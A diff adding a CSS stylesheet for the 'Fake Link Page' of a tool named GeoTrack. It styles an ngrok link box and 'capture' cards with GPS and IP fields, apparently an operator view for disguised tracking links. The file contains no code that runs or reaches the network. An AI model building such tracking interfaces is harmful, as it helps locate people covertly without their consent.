@@ -1,0 +1,77 @@
+/* ════════════════════════════════════════════
+   fakelink.css — Fake Link Page Styles
+   GeoTrack v2.0
+════════════════════════════════════════════ */
+
+/* Warning bar */
+.warn-box {
+  background: rgba(255,60,110,.07);
+  border: 1px solid rgba(255,60,110,.3);
+  padding: .8rem 1.2rem; margin-bottom: 1.4rem;
+  font-size: .83rem; color: var(--a2); border-radius: 3px;
+}
+
+/* Top 2-col layout */
+.fl-top { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; margin-bottom: 1.5rem; }
+
+/* Ngrok link box */
+.nbox {
+  background: rgba(0,255,136,.06); border: 1px solid rgba(0,255,136,.25);
+  padding: .8rem 1.1rem; border-radius: 3px;
+  font-family: 'Share Tech Mono', monospace; font-size: .76rem; color: var(--green);
+  word-break: break-all; display: flex; align-items: center;
+  justify-content: space-between; gap: .8rem; flex-wrap: wrap; margin: .5rem 0;
+}
+.cbtn {
+  background: transparent; color: var(--dim); border: 1px solid var(--border);
+  padding: .28rem .7rem; font-family: 'Share Tech Mono', monospace; font-size: .63rem;
+  cursor: pointer; transition: all .2s; border-radius: 2px; flex-shrink: 0; white-space: nowrap;
+}
+.cbtn:hover { color: var(--accent); border-color: var(--accent); }
+
+/* Stats 3-col */
+.ms3 { display: grid; grid-template-columns: repeat(3,1fr); gap: .8rem; margin: 1rem 0; }
+.mscard { background: var(--bg2); border: 1px solid var(--border); padding: .85rem; text-align: center; border-radius: 3px; }
+.msn { font-family: 'Orbitron', monospace; font-size: 1.2rem; font-weight: 900; color: var(--a2); }
+.msl { font-family: 'Share Tech Mono', monospace; font-size: .56rem; color: var(--dim); letter-spacing: 1px; margin-top: .2rem; }
+
+/* Captures grid */
+.cap-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+.cap-list { display: flex; flex-direction: column; gap: .7rem; max-height: 480px; overflow-y: auto; padding-right: .3rem; }
+
+/* Capture card */
+.capcard {
+  background: var(--bg2); border: 1px solid var(--border);
+  padding: .85rem; border-radius: 3px; position: relative;
+  font-family: 'Share Tech Mono', monospace; font-size: .7rem; transition: border-color .2s;
+}
+.capcard:hover { border-color: var(--accent); }
+.capcard::before {
+  content: ''; position: absolute; left: 0; top: 0; bottom: 0;
+  width: 3px; background: var(--accent); border-radius: 2px 0 0 2px;
+}
+.capcard.ip-m::before { background: var(--gold); }
+.capnum { font-family: 'Orbitron', monospace; font-size: .65rem; color: var(--accent); margin-bottom: .4rem; }
+.cr { display: flex; justify-content: space-between; padding: .17rem 0; border-bottom: 1px solid rgba(255,255,255,.04); gap: .4rem; }
+.cr:last-child { border: none; }
+.ck  { color: var(--dim); flex-shrink: 0; }
+.cv2 { color: var(--text); text-align: right; word-break: break-all; }
+.cv2.gps { color: var(--green); }
+.cv2.ipm { color: var(--gold); }
+
+/* Empty state */
+.cap-empty {
+  color: var(--dim); font-family: 'Share Tech Mono', monospace; font-size: .76rem;
+  text-align: center; padding: 3rem;
+  border: 1px dashed var(--border); border-radius: 3px;
+}
+
+/* Responsive */
+@media (max-width: 900px) {
+  .fl-top   { grid-template-columns: 1fr; }
+  .cap-grid { grid-template-columns: 1fr; }
+}
+@media (max-width: 600px) {
+  .ms3    { grid-template-columns: repeat(3,1fr); }
+  .map-cap { height: 280px; }
+}
